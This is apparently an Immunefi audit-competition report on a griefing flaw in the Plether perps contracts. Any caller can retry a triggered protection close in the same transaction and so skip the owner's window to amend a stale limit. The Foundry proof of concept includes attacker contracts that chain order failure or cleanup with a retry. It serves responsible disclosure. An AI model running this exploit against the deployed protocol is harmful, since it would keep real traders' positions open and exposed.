# \#98222 [SC-High] Permissionless protection retry preempts owner limit amendment and griefs protected closes

**Submitted on Nov 6th 2026 at 02:51:13 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98222
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An unprivileged caller can terminalize a position-protection close and retry it in the same transaction. The retry consumes the Latched interval in which only the owner can amend a now-stale close ceiling. It restores Triggered with that unchanged ceiling, so the close cannot execute at the current notional while the protection lock also prevents the owner from submitting an ordinary close. Repeated attacker-favored ordering keeps the protected trader's position open and exposed.

## Vulnerability Details
Affected source: packages/perps/src/PositionProtectionBook.sol at frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, especially retryPositionProtectionClose (lines 382–405), amendLatchedPositionProtectionCloseLimits (315–328), and handleFailedProtectionAttempt (637–675). The Router, recovery, and limit-enforcement paths are in the same scoped packages/perps/src tree.

A legitimate trader opens a position and creates take-profit/stop-loss protection with CloseFinancialLimits. The generated close and every retry copy those limits. A limit that admitted the close at trigger time can later become too low after ordinary market movement. In the attached test's small-move variant, a 10,000-unit position has 9,999 USDG execution notional at a 0.9999 trigger and the owner has set a 9,999.5 USDG maximum. A one-basis-point rebound to 1.0000 raises execution notional to 10,000 USDG; the policy evaluator returns ConstraintViolation for the stored maximum.

An arbitrary caller can execute that stale child to terminal constraint failure before expiry, or call permissionless OrderRouter.clearInvalidOrders([orderId]) after expiry. handleFailedProtectionAttempt deletes the old attempt mapping and moves a still-matching position to Latched; Router cleanup removes the pending child. In that state, the owner may amend the limit. But PositionProtectionBook.retryPositionProtectionClose(protectionId) has no account-owner check. The attacker immediately calls it in the same transaction as failure/cleanup. It queues a fresh zero-bounty child with the unchanged stored limits and _recordCloseAttempt sets Triggered.

The owner now receives OrderRouter__ProtectionNotLatched when amending; ordinary order commitment returns OrderRouter__ProtectionActive. Cancellation and the atomic cancel-and-commit-close path require PendingOpen or Armed, so neither is available after trigger. The retried child again fails its notional ceiling at the current price. The attacker can repeat the relatch/retry race with each failed or expired child.

This differs from Cecuro MED-9: that issue was generated closes ignoring trader ceilings. The frozen code enforces them. PR #124 added owner amendment after relatch; this finding is the new ability of an unrelated caller to preempt that sole owner-correction window. Project guidance tells reference workers to investigate persistent constraint failures before retrying, but arbitrary callers are not bound by that guidance.

## Impact Details
Medium — Griefing. The attacker pays gas and receives no retry bounty, but can repeatedly deny the owner a corrected exit while the 10,000-unit position remains open. The Forge test proves two attacker-controlled expiry/retry cycles, blocked owner amendment and ordinary close, a terminal ConstraintViolation with the position still open, and a control where owner amendment permits closing. Additional tests prove the attacker can force failure and retry before expiry, including with only a one-basis-point price rebound; the same tests pass with release VPI and margin parameters.

This is conditional on the attacker winning each relatch ordering race. The owner can recover if an amendment lands during a Latched interval, if the price returns within the limit, or if the position otherwise terminalizes. I do not claim a guaranteed one-hour or 24-hour freeze, a realized USDG loss, or attacker control of Pyth. The expiry route requires gas and ordering priority; the before-expiry execution route additionally requires valid Pyth update data and its fee.

## References
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L405
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L636-L675
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L67-L115
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L679
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L489-L503
- https://github.com/Plether-Fi/plether-core/pull/124

## Proof of Concept

## Proof of Concept
At frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, save the Solidity source below as packages/perps/test/perps/spec/trader/Exploit_ProtectionRetryPreemption.t.sol. Use Foundry 1.5.1 and solc 0.8.35. From the repository root run:

forge test --root packages/perps --offline --match-path test/perps/spec/trader/Exploit_ProtectionRetryPreemption.t.sol -vv

Observed locally: 6 tests passed, 0 failed, 0 skipped. The base contract tests two attacker-controlled expiry/retry cycles, an attacker-forced constraint failure plus retry before expiry, and a one-basis-point rebound. Exploit_ProtectionRetryPreemptionReleaseRisk repeats all three with release VPI=1%, initial margin=0.2%, maintenance margin=0.1%. The standard BasePerpTest fixture uses a two-feed MockPyth basket and mock USDG; the competition permits mocks for those out-of-scope components. The attack is on Book/Router status and authorization, which do not depend on basket composition. No scoped production source was changed and no public-chain transaction was sent.

Expected: after a stale child terminally fails, the protected owner can amend the retained ceiling before another caller can force a retry. Observed: an unrelated caller combines failure/expiry cleanup and retry in one transaction. The resulting Triggered child retains the stale limit; owner amendment and ordinary close both revert, and the position remains open. The owner-control branch closes after amendment when no attacker preempts.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

interface ICleanupRouter {

    function clearInvalidOrders(
        uint64[] calldata ids
    ) external returns (uint256 nextIndex, uint256 cleared);

}

contract CleanupAndRetry {

    function run(
        ICleanupRouter router,
        IPositionProtectionActions book,
        uint64 protectionId,
        uint64 expiredOrderId
    ) external returns (uint64 newOrderId) {
        uint64[] memory ids = new uint64[](1);
        ids[0] = expiredOrderId;
        (uint256 nextIndex, uint256 cleared) = router.clearInvalidOrders(ids);
        require(nextIndex == 1 && cleared == 1, "expired child not cleared");
        newOrderId = book.retryPositionProtectionClose(protectionId);
    }

}

interface IExecutionRouterForReview {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata updateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);

}

contract FailAndRetry {

    function run(
        IExecutionRouterForReview router,
        IPositionProtectionActions book,
        uint64 protectionId,
        uint64 staleOrderId,
        bytes[] calldata executionData
    ) external returns (uint64 newOrderId) {
        OrderV3Types.ExecutionResult memory result = router.executeOrder(staleOrderId, executionData);
        require(result.status == OrderV3Types.LifecycleStatus.Failed, "did not fail");
        require(result.terminalReason == OrderV3Types.TerminalReason.ConstraintViolation, "wrong failure");
        newOrderId = book.retryPositionProtectionClose(protectionId);
    }

}

contract Exploit_ProtectionRetryPreemption is BasePerpTest {

    address internal constant TRADER = address(0xA11CE);
    address internal constant ATTACKER = address(0xCA201);
    address internal constant KEEPER = address(0xE0EC);
    uint256 internal constant MARK = 100_000_000;
    uint256 internal constant TRIGGER_MARK = 90_000_000;
    uint256 internal constant SIZE = 10_000e18;
    uint256 internal constant MARGIN = 2000e6;

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    function setUp() public override {
        super.setUp();
        protectionActions = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        _fundTrader(TRADER, 20_000e6);
        _refreshMark(MARK);
    }

    function test_AttackerPreemptsOwnerAmendmentAfterEveryExpiry() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, MARK);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = TRIGGER_MARK;
        params.closeLimits.maxExecutionNotionalAssets = 9500e6;
        params.closeLimits.maxGrossAccountDebitAssets = type(uint256).max;
        params.closeLimits.maxActionChargeAssets = type(uint256).max;
        params.closeLimits.maxExplicitFeesAssets = type(uint256).max;
        vm.prank(TRADER);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        _mockPythUpdateData(TRIGGER_MARK);
        bytes[] memory triggerData = _livePriceData(TRIGGER_MARK);
        vm.prank(KEEPER);
        uint64 orderId = protectionActions.triggerPositionProtection(protectionId, triggerData);
        assertEq(router.lifecycleBook().pendingPolicy(orderId).maxExecutionNotionalAssets, 9500e6);

        CleanupAndRetry attacker = new CleanupAndRetry();
        PositionProtectionTypes.CloseFinancialLimits memory raised = params.closeLimits;
        raised.maxExecutionNotionalAssets = 12_000e6;

        for (uint256 cycle; cycle < 2; ++cycle) {
            uint64 deadline = router.lifecycleBook().orderTiming(orderId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            _mockPythUpdateData(MARK);
            router.updateMarkPrice(_livePriceData(MARK));
            assertEq(engine.lastMarkPrice(), MARK, "market returned above owner's 9500 ceiling");

            vm.prank(ATTACKER);
            orderId = attacker.run(ICleanupRouter(address(router)), protectionActions, protectionId, orderId);
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
            );
            assertEq(router.pendingOrderCounts(TRADER), 1);
            assertEq(router.lifecycleBook().pendingPolicy(orderId).maxExecutionNotionalAssets, 9500e6);

            vm.prank(TRADER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, raised);

            vm.prank(TRADER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);

            console2.log("preempted cycle", cycle + 1);
            console2.log("live child", orderId);
            console2.log("owner amendment blocked, pending orders", router.pendingOrderCounts(TRADER));
        }

        bytes[] memory executionData = _mockPythUpdateData(MARK);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory failed = router.executeOrder(orderId, executionData);
        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
        (uint256 stillOpen,,,,,,) = engine.positions(TRADER);
        assertEq(stillOpen, SIZE, "stale limit leaves position open");
        console2.log("failed retry, position size", stillOpen);

        // Control: absent preemption, the owner can amend and the next close succeeds.
        vm.prank(TRADER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, raised);
        vm.prank(ATTACKER);
        uint64 ownerAuthorizedOrder = protectionActions.retryPositionProtectionClose(protectionId);
        executionData = _mockPythUpdateData(MARK);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory succeeded = router.executeOrder(ownerAuthorizedOrder, executionData);
        assertEq(uint8(succeeded.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 closed,,,,,,) = engine.positions(TRADER);
        assertEq(closed, 0, "owner amendment allows closing");
        console2.log("owner control, position size", closed);
    }

    function test_AttackerForcesConstraintFailureAndRetriesBeforeExpiry() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, MARK);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = TRIGGER_MARK;
        params.closeLimits.maxExecutionNotionalAssets = 9500e6;
        params.closeLimits.maxGrossAccountDebitAssets = type(uint256).max;
        params.closeLimits.maxActionChargeAssets = type(uint256).max;
        params.closeLimits.maxExplicitFeesAssets = type(uint256).max;
        vm.prank(TRADER);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        _mockPythUpdateData(TRIGGER_MARK);
        vm.prank(KEEPER);
        uint64 staleOrderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(TRIGGER_MARK));

        uint64 deadline = router.lifecycleBook().orderTiming(staleOrderId).executionDeadline;
        bytes[] memory executionData = _mockPythUpdateData(MARK);
        router.updateMarkPrice(_livePriceData(MARK));
        assertLt(block.timestamp, uint256(deadline), "review requires pre-expiry failure");

        FailAndRetry attacker = new FailAndRetry();
        vm.prank(ATTACKER);
        uint64 newOrderId = attacker.run(
            IExecutionRouterForReview(address(router)), protectionActions, protectionId, staleOrderId, executionData
        );
        assertEq(router.pendingOrderCounts(TRADER), 1);
        assertEq(router.lifecycleBook().pendingPolicy(newOrderId).maxExecutionNotionalAssets, 9500e6);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
        (uint256 stillOpen,,,,,,) = engine.positions(TRADER);
        assertEq(stillOpen, SIZE);

        PositionProtectionTypes.CloseFinancialLimits memory raised = params.closeLimits;
        raised.maxExecutionNotionalAssets = 12_000e6;
        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, raised);
    }

    function test_AttackerPreemptsOnOneBasisPointPriceRebound() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, MARK);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = 99_990_000;
        params.closeLimits.maxExecutionNotionalAssets = 9_999_500_000;
        params.closeLimits.maxGrossAccountDebitAssets = type(uint256).max;
        params.closeLimits.maxActionChargeAssets = type(uint256).max;
        params.closeLimits.maxExplicitFeesAssets = type(uint256).max;
        vm.prank(TRADER);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        _mockPythUpdateData(99_990_000);
        vm.prank(KEEPER);
        uint64 staleOrderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(99_990_000));

        uint64 deadline = router.lifecycleBook().orderTiming(staleOrderId).executionDeadline;
        bytes[] memory executionData = _mockPythUpdateData(MARK);
        router.updateMarkPrice(_livePriceData(MARK));
        assertLt(block.timestamp, uint256(deadline), "review requires pre-expiry failure");

        FailAndRetry attacker = new FailAndRetry();
        vm.prank(ATTACKER);
        uint64 newOrderId = attacker.run(
            IExecutionRouterForReview(address(router)), protectionActions, protectionId, staleOrderId, executionData
        );
        assertEq(router.pendingOrderCounts(TRADER), 1);
        assertEq(router.lifecycleBook().pendingPolicy(newOrderId).maxExecutionNotionalAssets, 9_999_500_000);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
        (uint256 stillOpen,,,,,,) = engine.positions(TRADER);
        assertEq(stillOpen, SIZE);

        PositionProtectionTypes.CloseFinancialLimits memory raised = params.closeLimits;
        raised.maxExecutionNotionalAssets = 12_000e6;
        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, raised);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}

contract Exploit_ProtectionRetryPreemptionReleaseRisk is Exploit_ProtectionRetryPreemption {

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

}

```
